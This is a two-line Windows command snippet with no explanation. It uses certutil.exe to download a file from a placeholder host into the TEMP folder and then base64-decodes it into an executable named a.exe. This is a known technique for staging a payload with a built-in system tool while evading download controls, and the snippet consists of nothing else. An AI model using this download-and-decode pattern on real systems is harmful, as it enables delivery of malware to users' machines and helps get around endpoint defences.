certutil.exe -urlcache -split -f https://example.invalid/a.txt "$env:TEMP\a.txt"
certutil.exe -decode "$env:TEMP\a.txt" "$env:TEMP\a.exe"
